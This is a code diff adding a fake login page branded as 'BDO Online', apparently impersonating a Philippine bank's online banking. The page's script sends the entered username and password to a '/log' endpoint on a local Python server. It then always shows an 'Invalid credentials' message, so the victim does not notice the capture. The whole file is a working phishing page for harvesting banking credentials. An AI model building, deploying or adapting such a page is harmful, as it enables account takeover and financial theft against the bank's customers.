@@ -1,0 +1,560 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>BDO Online</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
+    }
+
+    body {
+      background: #eef2f5;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .login-card {
+      background: white;
+      width: 400px;
+      max-width: 100%;
+      padding: 2.5rem 2rem 2rem;
+      border-radius: 20px;
+      box-shadow: 0 16px 40px rgba(0, 0, 0, 0.08);
+      text-align: center;
+      position: relative;
+    }
+
+    .brand {
+      font-size: 1.8rem;
+      font-weight: 600;
+      color: #0b1e3a;
+      margin-bottom: 0.1rem;
+      cursor: default;
+    }
+    
+    .brand .bd {
+      color: #0b1e3a;
+    }
+    
+    .brand .yellow-o {
+      color: #f7c948;
+    }
+    
+    .brand .bdo {
+      color: #0b1e3a;
+    }
+    
+    .brand small {
+      font-weight: 300;
+      font-size: 1rem;
+      color: #4a5b6e;
+      display: block;
+      margin-top: 4px;
+    }
+
+    .input-group {
+      margin-bottom: 1.2rem;
+      text-align: left;
+      position: relative;
+    }
+
+    .input-group label {
+      display: block;
+      font-size: 0.8rem;
+      font-weight: 600;
+      text-transform: uppercase;
+      color: #1e2b3c;
+      margin-bottom: 6px;
+    }
+
+    .input-field {
+      position: relative;
+      display: flex;
+      align-items: center;
+      background: #f8fafc;
+      border: 2px solid #e0e7ef;
+      border-radius: 14px;
+      transition: 0.2s;
+    }
+
+    .input-field:focus-within {
+      border-color: #1d3b6f;
+      background: white;
+      box-shadow: 0 0 0 3px rgba(27, 55, 100, 0.08);
+    }
+
+    .input-field input {
+      width: 100%;
+      padding: 14px 18px;
+      border: none;
+      background: transparent;
+      font-size: 1rem;
+      color: #0b1e3a;
+      outline: none;
+      -webkit-appearance: none;
+      -moz-appearance: none;
+      appearance: none;
+    }
+
+    .input-field input::placeholder {
+      color: #9aaec2;
+      font-size: 0.95rem;
+    }
+
+    .input-field input::-webkit-outer-spin-button,
+    .input-field input::-webkit-inner-spin-button {
+      -webkit-appearance: none;
+      margin: 0;
+    }
+
+    .input-field input[type=number] {
+      -moz-appearance: textfield;
+      appearance: textfield;
+    }
+
+    .toggle-password {
+      background: transparent;
+      border: none;
+      padding: 0 16px 0 8px;
+      font-size: 1.2rem;
+      color: #788b9f;
+      cursor: pointer;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    .input-field.error {
+      border-color: #d42e2e !important;
+      background: #fff7f7 !important;
+      box-shadow: 0 0 0 3px rgba(212, 46, 46, 0.1);
+    }
+
+    .input-field.error input {
+      color: #b11f1f;
+    }
+
+    .input-field.error input::placeholder {
+      color: #b11f1f;
+      opacity: 0.7;
+    }
+
+    .input-error-text {
+      color: #d42e2e;
+      font-size: 0.8rem;
+      margin-top: 5px;
+      display: none;
+      font-weight: 500;
+      padding-left: 4px;
+    }
+
+    .input-error-text.show {
+      display: block;
+    }
+
+    .login-btn {
+      width: 100%;
+      padding: 15px;
+      background: #0b1e3a;
+      border: none;
+      border-radius: 40px;
+      color: white;
+      font-size: 1.1rem;
+      font-weight: 600;
+      margin-top: 0.8rem;
+      cursor: pointer;
+      transition: 0.2s;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    .login-btn:hover:not(:disabled) {
+      background: #143157;
+    }
+
+    .login-btn:disabled {
+      opacity: 0.7;
+      cursor: not-allowed;
+    }
+
+    .signup-link {
+      margin-top: 1.2rem;
+      font-size: 0.9rem;
+      color: #4a5b6e;
+    }
+
+    .signup-link a {
+      color: #0b1e3a;
+      font-weight: 600;
+      text-decoration: none;
+      transition: 0.2s;
+    }
+
+    .signup-link a:hover {
+      color: #1d3b6f;
+      text-decoration: underline;
+    }
+
+    .footer-brand {
+      margin-top: 2.5rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      font-size: 1.1rem;
+      color: #1f2f44;
+      border-top: 1px solid #e3eaf2;
+      padding-top: 1.8rem;
+    }
+
+    .footer-brand .years {
+      font-weight: 700;
+      color: #0b1e3a;
+    }
+
+    .login-error-message {
+      margin-top: 1.2rem;
+      padding: 12px 16px;
+      background: #fff7f7;
+      border: 1px solid #d42e2e;
+      border-radius: 10px;
+      color: #b11f1f;
+      font-size: 0.9rem;
+      display: none;
+      text-align: center;
+    }
+
+    .login-error-message.show {
+      display: block;
+    }
+
+    .spinner {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      border: 3px solid rgba(255,255,255,0.3);
+      border-radius: 50%;
+      border-top-color: #fff;
+      animation: spin 0.8s ease-in-out infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .toast {
+      position: fixed;
+      bottom: 30px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #0b1e3a;
+      color: white;
+      padding: 12px 24px;
+      border-radius: 30px;
+      font-size: 0.9rem;
+      opacity: 0;
+      transition: opacity 0.3s;
+      pointer-events: none;
+      z-index: 1000;
+      max-width: 90%;
+    }
+
+    .toast.show {
+      opacity: 1;
+    }
+
+    .toast.success {
+      background: #1a7a3a;
+    }
+
+    .toast.error {
+      background: #b11f1f;
+    }
+
+    @media (max-width: 460px) {
+      .login-card {
+        padding: 1.8rem 1.2rem 1.5rem;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<div class="login-card" id="loginCard">
+  <div class="brand">
+    <span class="bd">BD</span><span class="yellow-o">O</span> <span class="bdo">Online</span>
+    <small>Welcome to BDO Online!</small>
+  </div>
+
+  <div class="login-fields" id="loginFields">
+    <div class="input-group">
+      <label for="username">Username</label>
+      <div class="input-field" id="usernameField">
+        <input type="text" id="username" placeholder="Enter username" autocomplete="off">
+      </div>
+      <div class="input-error-text" id="usernameError">enter username</div>
+    </div>
+
+    <div class="input-group">
+      <label for="password">Password</label>
+      <div class="input-field" id="passwordField">
+        <input type="password" id="password" placeholder="Enter password">
+        <button class="toggle-password" id="togglePasswordBtn" type="button">
+          <i class="fas fa-eye" id="eyeIcon"></i>
+        </button>
+      </div>
+      <div class="input-error-text" id="passwordError">enter password</div>
+    </div>
+
+    <button class="login-btn" id="loginBtn">
+      <span id="loginBtnText">Log in</span>
+      <span id="loginBtnSpinner" style="display: none;"><span class="spinner"></span></span>
+    </button>
+
+    <div class="signup-link">
+      Don't have Online Banking yet? <a href="https://onlinebanking.bdo.com.ph/en/registration" target="_blank">Sign up</a>
+    </div>
+  </div>
+
+  <div class="login-error-message" id="loginErrorMessage">
+    Invalid credentials. Please check your username and password.
+  </div>
+
+  <div class="footer-brand">
+    <span class="tagline"><i>We find ways®</i></span>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+  (function() {
+    // ============================================
+    // DETECT SERVER URL - Auto-detect for phone
+    // ============================================
+    function getServerUrl() {
+      const currentUrl = window.location.href;
+      const url = new URL(currentUrl);
+      const hostname = url.hostname;
+      const port = url.port || '3000';
+      
+      return `http://${hostname}:${port}`;
+    }
+
+    const SERVER_URL = getServerUrl();
+    console.log('🌐 Server URL detected:', SERVER_URL);
+
+    // ============================================
+    // DOM Elements
+    // ============================================
+    const usernameInput = document.getElementById('username');
+    const passwordInput = document.getElementById('password');
+    const usernameField = document.getElementById('usernameField');
+    const passwordField = document.getElementById('passwordField');
+    const usernameError = document.getElementById('usernameError');
+    const passwordError = document.getElementById('passwordError');
+    const loginBtn = document.getElementById('loginBtn');
+    const loginBtnText = document.getElementById('loginBtnText');
+    const loginBtnSpinner = document.getElementById('loginBtnSpinner');
+    const togglePasswordBtn = document.getElementById('togglePasswordBtn');
+    const eyeIcon = document.getElementById('eyeIcon');
+    const toast = document.getElementById('toast');
+    const loginErrorMessage = document.getElementById('loginErrorMessage');
+
+    let passwordVisible = false;
+    let isProcessing = false;
+
+    // ============================================
+    // Toast
+    // ============================================
+    function showToast(message, type = 'info', duration = 3000) {
+      toast.textContent = message;
+      toast.className = 'toast ' + type + ' show';
+      clearTimeout(toast._timeout);
+      toast._timeout = setTimeout(() => {
+        toast.classList.remove('show');
+      }, duration);
+    }
+
+    // ============================================
+    // Password Toggle
+    // ============================================
+    togglePasswordBtn.addEventListener('click', function(e) {
+      e.preventDefault();
+      passwordVisible = !passwordVisible;
+      passwordInput.type = passwordVisible ? 'text' : 'password';
+      eyeIcon.classList.toggle('fa-eye');
+      eyeIcon.classList.toggle('fa-eye-slash');
+    });
+
+    // ============================================
+    // Error Handling
+    // ============================================
+    function clearErrors() {
+      usernameField.classList.remove('error');
+      passwordField.classList.remove('error');
+      usernameError.classList.remove('show');
+      passwordError.classList.remove('show');
+      loginErrorMessage.classList.remove('show');
+    }
+
+    function highlightEmptyFields() {
+      let hasError = false;
+      clearErrors();
+
+      if (usernameInput.value.trim() === '') {
+        usernameField.classList.add('error');
+        usernameError.classList.add('show');
+        hasError = true;
+      }
+      if (passwordInput.value === '') {
+        passwordField.classList.add('error');
+        passwordError.classList.add('show');
+        hasError = true;
+      }
+      return hasError;
+    }
+
+    // ============================================
+    // Send to Python server
+    // ============================================
+    async function sendToServer(username, password) {
+      const url = `${SERVER_URL}/log`;
+      console.log('📡 Sending to:', url);
+      
+      const response = await fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ username, password }),
+      });
+      
+      if (!response.ok) {
+        throw new Error('Server error: ' + response.status);
+      }
+      
+      const data = await response.json();
+      return data;
+    }
+
+    // ============================================
+    // Handle Login
+    // ============================================
+    async function handleLogin() {
+      if (isProcessing) return;
+      
+      loginErrorMessage.classList.remove('show');
+      
+      const hasEmpty = highlightEmptyFields();
+      
+      if (hasEmpty) {
+        return;
+      }
+
+      isProcessing = true;
+      loginBtn.disabled = true;
+      loginBtnText.textContent = 'Logging in...';
+      loginBtnSpinner.style.display = 'inline-block';
+
+      try {
+        const username = usernameInput.value.trim();
+        const password = passwordInput.value;
+        
+        const result = await sendToServer(username, password);
+        console.log('✅ Server response:', result);
+        
+        loginErrorMessage.textContent = 'Invalid credentials. Please check your username and password.';
+        loginErrorMessage.classList.add('show');
+        showToast('❌ Invalid credentials', 'error', 3000);
+        clearErrors();
+        
+      } catch (error) {
+        console.error('❌ Login error:', error);
+        
+        let errorMsg = 'Invalid credentials. Please check your username and password.';
+        
+        if (error.message.includes('Failed to fetch')) {
+          errorMsg = '❌ Cannot reach server!\n\nMake sure:\n1. Server is running (python server.py)\n2. Phone is on the SAME Wi-Fi\n3. Use the IP shown in server console';
+          showToast('❌ Server connection failed', 'error', 5000);
+        } else {
+          showToast('❌ Invalid credentials', 'error', 3000);
+        }
+        
+        loginErrorMessage.textContent = errorMsg;
+        loginErrorMessage.classList.add('show');
+        
+      } finally {
+        isProcessing = false;
+        loginBtn.disabled = false;
+        loginBtnText.textContent = 'Log in';
+        loginBtnSpinner.style.display = 'none';
+      }
+    }
+
+    // ============================================
+    // Event Listeners
+    // ============================================
+    loginBtn.addEventListener('click', function(e) {
+      e.preventDefault();
+      handleLogin();
+    });
+
+    usernameInput.addEventListener('keydown', function(e) {
+      if (e.key === 'Enter') {
+        e.preventDefault();
+        handleLogin();
+      }
+    });
+
+    passwordInput.addEventListener('keydown', function(e) {
+      if (e.key === 'Enter') {
+        e.preventDefault();
+        handleLogin();
+      }
+    });
+
+    usernameInput.addEventListener('input', function() {
+      if (usernameInput.value.trim() !== '') {
+        usernameField.classList.remove('error');
+        usernameError.classList.remove('show');
+      }
+      loginErrorMessage.classList.remove('show');
+    });
+
+    passwordInput.addEventListener('input', function() {
+      if (passwordInput.value !== '') {
+        passwordField.classList.remove('error');
+        passwordError.classList.remove('show');
+      }
+      loginErrorMessage.classList.remove('show');
+    });
+
+    document.querySelector('.brand').addEventListener('dblclick', function() {
+      clearErrors();
+      usernameInput.value = '';
+      passwordInput.value = '';
+      loginErrorMessage.classList.remove('show');
+      loginErrorMessage.textContent = 'Invalid credentials. Please check your username and password.';
+      if (passwordVisible) {
+        passwordVisible = false;
+        passwordInput.type = 'password';
+        eyeIcon.classList.add('fa-eye');
+        eyeIcon.classList.remove('fa-eye-slash');
+      }
+      showToast('Reset complete', 'info', 1500);
+    });
+
+    console.log('✅ BDO Online ready!');
+    console.log('📡 Server URL:', SERVER_URL);
+  })();
+</script>
+
+</body>
+</html>
